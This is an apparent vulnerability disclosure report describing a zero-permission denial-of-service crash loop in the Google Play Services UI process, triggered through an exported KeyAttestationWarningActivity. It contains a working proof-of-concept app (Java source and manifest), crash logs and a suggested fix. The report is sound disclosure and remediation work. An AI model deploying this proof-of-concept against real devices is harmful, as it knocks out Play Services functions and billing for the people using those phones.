# Google Play Services UI Process Crash Loop via KeyAttestationWarningActivity

## Summary

A zero-permission attacker app can crash the `com.google.android.gms.ui` process by launching the exported `KeyAttestationWarningActivity`. The activity fails to handle a null calling package, causing an unhandled `SecurityException` that crashes the process. Since the activity remains in the task stack, the system auto-restarts the process and re-launches the activity, creating a crash loop of 10+ cycles that persists until Android's crash rate limiter intervenes.

## Severity

**Medium** — Availability violation. Zero-permission DoS of Google Play Services UI process with cascading impact on Play Store billing.

## Affected Component

- **Activity**: `com.google.android.gms/.auth.keyattestation.KeyAttestationWarningActivity`
- **Process**: `com.google.android.gms.ui`
- **Package**: Google Play Services (com.google.android.gms)
- **Version**: 26.34.36 (260400-981326859)

## Affected Device

- **Model**: Pixel 6a (bluejay)
- **OS**: Android 17 beta (CP41.260814.003.A2)
- **Build type**: user (production)

## Root Cause

`KeyAttestationWarningActivity` is exported with an intent-filter but does not validate or handle the case where `getCallingPackage()` returns null. When launched by a third-party app via `startActivity()` (rather than `startActivityForResult()`), the calling package is null, causing:

```
java.lang.SecurityException: Calling package was null
    at bpph.w(:com.google.android.gms@263436035:27)
    at boiq.a(:com.google.android.gms@263436035:10)
    at KeyAttestationWarningChimeraActivity.onCreate(:com.google.android.gms@263436035:1)
```

This propagates as:
```
java.lang.RuntimeException: Unable to start activity ComponentInfo{com.google.android.gms/com.google.android.gms.auth.keyattestation.KeyAttestationWarningActivity}
```

## Attack Scenario

1. Attacker installs a zero-permission app on the victim's device
2. App launches `KeyAttestationWarningActivity` via explicit component intent
3. GMS UI process crashes immediately on `onCreate()`
4. System restarts the process and attempts to resume the activity
5. Activity crashes again → crash loop (10+ iterations observed)
6. During the crash loop, all GMS UI functions are unavailable
7. Play Store billing service (`InAppBillingService`) also restarts due to the crash

## Proof of Concept

### PoC App: GmsCrashExploitActivity.java

```java
package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class GmsCrashExploitActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Intent i = new Intent();
        i.setComponent(new ComponentName("com.google.android.gms",
            "com.google.android.gms.auth.keyattestation.KeyAttestationWarningActivity"));
        startActivity(i);
    }
}
```

### AndroidManifest.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vrp.zeroperm">
    <!-- ZERO permissions declared -->
    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />
    <application android:label="ZeroPerm" android:allowBackup="false">
        <activity android:name=".GmsCrashExploitActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

## Evidence

### Attacker UID Confirmation
```
09-27 12:55:26.185 W GMS_CRASH_EXPLOIT: UID=10394 PID=4676
09-27 12:55:26.185 W GMS_CRASH_EXPLOIT: ZERO PERMISSIONS
09-27 12:55:26.196 W GMS_CRASH_EXPLOIT: [+] KeyAttestationWarningActivity launched
```

### Activity Launch from Zero-Perm App
```
START u0 {cmp=com.google.android.gms/.auth.keyattestation.KeyAttestationWarningActivity}
  from uid 10394 (com.vrp.zeroperm) (BAL_ALLOW_VISIBLE_WINDOW) result code=0
```

### Crash Loop (10 sequential crashes in ~2 seconds)
```
12:55:26.074 FATAL EXCEPTION: main — Process: com.google.android.gms.ui, PID: 4597
12:55:26.113 Process com.google.android.gms.ui (pid 4597) has died: fg TOP
12:55:26.400 FATAL EXCEPTION: main — PID: 4712
12:55:26.428 Process com.google.android.gms.ui (pid 4712) has died: fg TOP
12:55:26.572 FATAL EXCEPTION: main — PID: 4792
12:55:26.603 Process com.google.android.gms.ui (pid 4792) has died: fg TOP
12:55:26.758 FATAL EXCEPTION: main — PID: 4843
12:55:26.798 Process com.google.android.gms.ui (pid 4843) has died: fg TOP
12:55:26.952 FATAL EXCEPTION: main — PID: 4901
12:55:26.983 Process com.google.android.gms.ui (pid 4901) has died: fg TOP
12:55:27.138 FATAL EXCEPTION: main — PID: 4955
12:55:27.172 Process com.google.android.gms.ui (pid 4955) has died: fg TOP
12:55:27.341 FATAL EXCEPTION: main — PID: 5028
12:55:27.374 Process com.google.android.gms.ui (pid 5028) has died: fg TOP
12:55:27.530 FATAL EXCEPTION: main — PID: 5079
12:55:27.569 Process com.google.android.gms.ui (pid 5079) has died: fg TOP
12:55:27.746 FATAL EXCEPTION: main — PID: 5137
12:55:27.779 Process com.google.android.gms.ui (pid 5137) has died: fg TOP
12:55:27.945 FATAL EXCEPTION: main — PID: 5188
12:55:27.974 Process com.google.android.gms.ui (pid 5188) has died: fg TOP
```

### Cascading Impact — Play Store Billing Service Restart
```
12:55:26.616 W ActivityManager: Rescheduling restart of crashed service
  com.android.vending/com.google.android.finsky.billing.iab.InAppBillingService
  in 0ms for mem-pressure-event
```

### DropBox Crash Records
```
system_app_crash: Process: com.google.android.gms.ui
RuntimeException: Unable to start activity ComponentInfo{
  com.google.android.gms/com.google.android.gms.auth.keyattestation.KeyAttestationWarningActivity}
Caused by: SecurityException: Calling package was null
```

## Impact

1. **Availability**: GMS UI process crashes in a loop (10+ crash-restart cycles), making GMS UI functions temporarily unavailable
2. **Cascading failure**: Play Store in-app billing service restarts during the crash loop
3. **No user interaction required**: The crash triggers automatically when the activity is launched
4. **Zero permissions**: The attacker app requires no Android permissions
5. **Production build**: Verified on a production "user" build, not userdebug

## Suggested Fix

In `KeyAttestationWarningChimeraActivity.onCreate()`, check if `getCallingPackage()` is null before using it, and call `finish()` if it is:

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if (getCallingPackage() == null) {
        finish();
        return;
    }
    // ... existing logic
}
```

Alternatively, remove the `exported=true` flag or add a permission requirement to the activity declaration if it is only intended for internal use.
